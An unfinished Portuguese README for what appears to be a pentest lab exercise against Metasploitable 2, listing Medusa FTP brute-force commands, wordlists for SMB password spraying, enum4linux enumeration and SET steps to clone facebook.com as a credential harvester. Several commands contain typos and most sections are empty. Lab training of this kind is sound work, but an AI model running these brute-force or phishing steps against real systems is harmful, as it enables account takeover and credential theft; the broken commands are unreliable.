# Desafio medusa


## Ferramentas
- Kali Linux
- Medusa
- Metasploitable 2
- VM Kali + VM Metasploitable 2

# Simulados:

## Força bruta em FTP: 

### WordLists

- users.txt
- passwords.txt
  
```
echo
echo-e 'user\nmsfadmin\admin\nroot' > users.txt 
```
``` medusa -h 192.16.56.102 -U usaer.txt -P pass.txt -M ftp -t 6 ```


## Automação de tentativas em formulário web (DVWA) 

https://192.168.56.10/dvwa/login.php

## Password spraying em SMB com enumeração de usuários


 enum4linux -a 192.168.56.102 | tee enum_output.txt

Resultado:

<img width="1345" height="945" alt="Captura de tela de 2026-11-06 16-46-21" src="https://github.com/user-attachments/assets/4fd3010c-a5bf-4af1-bf3e-2cb22f8c6424" />

Linhas de comando:
```
echo -e "user\nadmin\nmsfadmin\nservice" > smb_users.txt 
echo -e "passowrd\n123456\nWelome123\nmsfadmin" > senhas_spray.txt
```




Acesso root: sudo su
Iniciando o setoolkit: setoolkit
Tipo de ataque: Social-Engineering Attacks
Vetor de ataque: Web Site Attack Vectors
Método de ataque: Credential Harvester Attack Method 
Método de ataque: Site Cloner
Obtendo o endereço da máquina: ifconfig
URL para clone: http://www.facebook.com



## Comandos utilizados


## Validação de acessos 


## Recomendações de mitigação


## Resutados


